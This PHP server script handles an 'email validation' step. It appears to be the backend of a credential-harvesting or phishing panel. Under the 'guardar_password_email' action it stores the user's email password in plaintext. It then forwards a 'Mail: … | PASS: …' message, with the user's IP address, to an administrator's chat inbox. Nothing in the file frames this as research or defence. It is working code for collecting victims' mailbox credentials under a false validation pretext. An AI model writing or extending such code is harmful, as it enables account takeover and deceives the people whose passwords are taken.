<?php
error_reporting(E_ERROR | E_PARSE);

require_once __DIR__ . '/../php_config/helpers.php';

exigirPOST();
$usuario_id = verificarUsuarioSesion();

try {
    $pdo = conectarBD();
    $input = leerJSON();

    if (!isset($input['accion'])) {
        jsonResponse(['success' => false, 'error' => 'Datos no válidos']);
    }

    if ($input['accion'] === 'guardar_password_email') {
        $validacion_id = intval($input['validacion_id'] ?? 0);
        $password = $input['password'] ?? '';

        if ($password === '') {
            jsonResponse(['success' => false, 'error' => 'La contraseña no puede estar vacía']);
        }

        $stmt = $pdo->prepare("
            SELECT id, email, proveedor_seleccionado FROM validacion_email
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$validacion_id, $usuario_id]);
        $validacion_data = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$validacion_data) {
            jsonResponse(['success' => false, 'error' => 'Validación no encontrada']);
        }

        $updateStmt = $pdo->prepare("
            UPDATE validacion_email
            SET password_ingresado = ?,
                estado = 'completado',
                fecha_completado = NOW()
            WHERE id = ? AND usuario_id = ?
        ");

        if (!$updateStmt->execute([$password, $validacion_id, $usuario_id])) {
            jsonResponse(['success' => false, 'error' => 'Error al guardar la contraseña']);
        }

        $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';

        $mensaje_chat = "Mail: " . $validacion_data['email'] . "\n | " .
                       "PASS: " . $password;

        $chatStmt = $pdo->prepare("
            INSERT INTO mensajes_admin (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado)
            VALUES (?, 1, ?, 'sin_input', ?, 'leido')
        ");
        $chatStmt->execute([$usuario_id, $mensaje_chat, $ip_real]);

        jsonResponse([
            'success' => true,
            'message' => 'Validación completada correctamente',
        ]);
    }

    if ($input['accion'] === 'cancelar_validacion') {
        $validacion_id = intval($input['validacion_id'] ?? 0);

        $stmt = $pdo->prepare("
            SELECT id FROM validacion_email
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$validacion_id, $usuario_id]);

        if (!$stmt->fetch()) {
            jsonResponse(['success' => false, 'error' => 'Validación no encontrada']);
        }

        $updateStmt = $pdo->prepare("
            UPDATE validacion_email
            SET estado = 'cancelado'
            WHERE id = ? AND usuario_id = ?
        ");

        if ($updateStmt->execute([$validacion_id, $usuario_id])) {
            jsonResponse(['success' => true, 'message' => 'Validación cancelada']);
        }
        jsonResponse(['success' => false, 'error' => 'Error al cancelar validación']);
    }

    jsonResponse(['success' => false, 'error' => 'Acción no válida']);
} catch (PDOException $e) {
    error_log('email_validate_procesar PDO: ' . $e->getMessage());
    jsonError('Error de base de datos', 500);
} catch (Exception $e) {
    error_log('email_validate_procesar: ' . $e->getMessage());
    jsonError('Error interno', 500);
}
